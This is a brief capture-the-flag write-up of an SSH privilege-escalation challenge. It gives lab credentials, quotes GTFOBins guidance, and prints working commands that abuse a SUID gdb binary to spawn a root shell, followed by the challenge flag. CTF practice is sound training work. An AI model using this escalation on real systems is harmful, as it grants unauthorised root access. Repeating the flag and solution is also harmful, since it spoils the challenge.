
Enter the digital network of the Assassins Brotherhood. Prove your worth in this cyber-espionage challenge, where ascending brings greater privileges, as each Assassins follow the hierarchy very strictly . Uncover the brotherhood's secrets.

nc 0.cloud.chals.io 24415

Similar to first one connect to ssh using
username: `ezio`
password: `renaissance`

now we need to escalate privelege escalation
## [SUID](https://gtfobins.github.io/gtfobins/gdb/#suid)


If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

- This requires that GDB is compiled with Python support.
    
    ```shell

    install -m =xs $(which gdb) .
    
    gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
    ```

This is old privilege access

![[Pasted image 20240810231210.png]]

After doing GTFO suid

![[Pasted image 20240810231434.png]]

The flag is
```
KPMG_CTF{7a216f8be662e501013208b8a398cde4}
```
